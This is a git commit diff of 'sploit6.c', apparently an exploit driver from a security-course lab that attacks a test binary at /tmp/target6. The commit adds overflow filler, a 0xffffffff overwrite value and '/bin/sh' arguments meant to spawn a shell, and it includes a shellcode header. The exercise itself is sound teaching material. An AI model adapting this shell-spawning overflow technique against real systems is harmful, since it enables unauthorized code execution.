8bb928f87ddbab2ff7512b71750b20a8ea30ff91
gensone <f.marcantoni94@gmail.com>
2017-09-29 00:25:31 +0000

    sploit6 finished

--- sploits/sploit6.c
+++ sploits/sploit6.c
@@ -3,15 +3,29 @@
 #include <string.h>
 #include <stdint.h>
 #include <unistd.h>
+#include "shellcode.h"
 
 #define TARGET "/tmp/target6"
 
 int main(void)
 {
-	char arg1[] = "password";
-	char arg2[] = "echo";
-	char arg3[] = "'hi!'";
-	char *args[] = { TARGET, arg1, arg2, arg3, NULL };
+	//char arg1[] = "$5$afkj23234ASF$T.C3isXspLrawvd2smItz4/.r15VkfIW/xxIlgtVixB";
+	char arg1[1024];
+	char arg2[8]; //1023
+	char arg3[3] = "-c";
+	char arg4[8] = "/bin/sh";
+	char arg5[5] = "echo";
+	char arg6[999];
+	char arg7[20];
+
+	
+	strcpy(arg2, "/bin/sh");
+	strcpy(arg1, "prova\n");
+	memset(arg6, 'A', sizeof(arg6));
+	*(unsigned*)(&arg7[0]) = 0xffffffff;
+
+	char *args[] = { TARGET, arg1, arg2, arg3, arg4, arg5, arg6,
+	arg7, NULL };
 	char *env[] = { NULL };
 
 	if (0 > execve(TARGET, args, env))
@@ -19,3 +33,4 @@ int main(void)
 
 	return 0;
 }
+
